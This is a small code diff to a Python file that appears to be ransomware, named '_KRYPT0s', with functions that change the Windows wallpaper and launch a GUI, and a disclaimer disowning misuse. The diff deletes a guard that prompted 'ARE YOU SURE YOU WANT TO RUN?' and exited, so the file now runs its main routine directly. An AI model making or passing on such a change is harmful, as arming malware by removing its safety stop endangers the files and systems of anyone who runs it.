@@ -376,10 +376,7 @@ def main():
     change_windows_wallpaper()
     launch_gui() 
 
-if __name__ == "__main__":
-    input("ARE YOU SURE YOU WANT TO RUN?")
-    exit()
-    
+if __name__ == "__main__":    
     main() # Launch _KRYPT0s
 
 # I AM NOT RESPONSIBLE FOR ANY MISDOINGS
